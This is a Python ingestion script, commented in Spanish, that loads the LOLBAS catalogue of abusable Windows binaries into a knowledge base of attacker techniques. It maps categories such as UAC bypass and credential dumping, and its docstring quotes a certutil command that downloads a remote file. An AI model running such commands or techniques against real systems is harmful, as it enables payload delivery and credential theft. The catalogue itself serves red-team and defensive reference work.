#!/usr/bin/env python3
"""
ingest_lolbas.py — Ingesta LOLBAS (Living Off The Land Binaries/Scripts de Windows) al RAG de conocimiento.

LOLBAS = binarios/scripts/librerías legítimos de Windows abusables (ejecución, descarga, bypass de UAC/AWL,
volcado de credenciales, ADS...). Es el espejo Windows de GTFOBins. Fuente: repo LOLBAS-Project/LOLBAS →
ficheros `yml/<tipo>/<Bin>.yml`. Formato:
  Name: Certutil.exe
  Commands:
    - Command: certutil.exe -urlcache -f {REMOTEURL} {PATH}
      Category: Download        # Execute/Download/UAC bypass/AWL bypass/Credentials/Dump/ADS/...
      Privileges: User          # User/Admin/SYSTEM
      MitreID: T1105

Uso:
    python ingest_lolbas.py --src <ruta al repo LOLBAS clonado>
(El refresh clona el repo; aquí se parsea. PyYAML solo en ingesta; la query es stdlib.)
"""
import argparse
import glob
import json
import os
import sys
from datetime import datetime, timezone

import yaml  # solo ingesta (paso offline)

import kb

LOLBAS_URL = "https://lolbas-project.github.io/lolbas/"

# Categoría LOLBAS -> nuestra category. Las que son señal de elevación van a 'privesc'.
CATEGORY_MAP = {
    "execute": "execution",
    "download": "ingress", "upload": "exfil", "copy": "misc",
    "encode": "defense-evasion", "decode": "defense-evasion",
    "awl bypass": "defense-evasion", "uac bypass": "privesc",
    "credentials": "credential-access", "dump": "credential-access",
    "reconnaissance": "discovery", "compile": "execution",
    "ads": "defense-evasion", "tamper": "defense-evasion",
}
# Carpeta del repo -> segmento de URL del sitio LOLBAS.
TYPE_URL = {
    "OSBinaries": "Binaries", "OSScripts": "Scripts", "OSLibraries": "Libraries",
    "OtherMSBinaries": "OtherMSBinaries", "HonorableMentions": "OtherMSBinaries",
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--src", required=True, help="ruta al repo LOLBAS clonado")
    args = ap.parse_args()
    ydir = os.path.join(args.src, "yml")
    files = sorted(glob.glob(os.path.join(ydir, "**", "*.yml"), recursive=True))
    if not files:
        print(f"[LOLBAS] No encuentro ficheros .yml en {ydir}", file=sys.stderr)
        sys.exit(2)

    conn = kb.connect()
    now = datetime.now(timezone.utc).isoformat()
    n_bin = n_tech = 0
    for f in files:
        try:
            data = yaml.safe_load(open(f, encoding="utf-8", errors="replace"))
        except (OSError, yaml.YAMLError):
            continue
        if not isinstance(data, dict) or not data.get("Commands"):
            continue
        name = (data.get("Name") or os.path.basename(f)).strip()
        stem = os.path.splitext(name)[0]
        typ = os.path.basename(os.path.dirname(f))
        url = LOLBAS_URL + TYPE_URL.get(typ, "Binaries") + "/" + stem + "/"
        n_bin += 1
        for cmd in data["Commands"]:
            if not isinstance(cmd, dict):
                continue
            command = (cmd.get("Command") or "").strip()
            if not command:
                continue
            cat_raw = (cmd.get("Category") or "").strip()
            category = CATEGORY_MAP.get(cat_raw.lower(), "misc")
            subtype = cat_raw.lower().replace(" ", "-") or "misc"
            mitre = (cmd.get("MitreID") or "").strip() or None
            priv = (cmd.get("Privileges") or "").strip()
            precond = f"privilegios: {priv}" if priv else ""
            desc = (cmd.get("Description") or cmd.get("Usecase") or "").strip()
            tags = json.dumps(sorted({stem.lower(), subtype, category, cat_raw.lower(),
                                      "lolbas", "windows"} - {""}))
            conn.execute(
                "INSERT OR IGNORE INTO techniques(source,platform,category,tactic,mitre_id,name,"
                "subtype,preconditions,command,description,tags,source_ref,updated_at) "
                "VALUES('lolbas','windows',?,?,?,?,?,?,?,?,?,?,?)",
                (category, None, mitre, name, subtype, precond, command, desc, tags, url, now),
            )
            n_tech += 1
    kb.set_meta(conn, "lolbas_last_sync", now)
    kb.set_meta(conn, "lolbas_binaries", n_bin)
    conn.commit()
    total = conn.execute("SELECT COUNT(*) c FROM techniques").fetchone()["c"]
    win = conn.execute("SELECT COUNT(*) c FROM techniques WHERE source='lolbas'").fetchone()["c"]
    conn.close()
    print(f"[LOLBAS] {n_bin} binarios, {n_tech} técnicas (upsert). Store: {total} ({win} lolbas).")


if __name__ == "__main__":
    main()
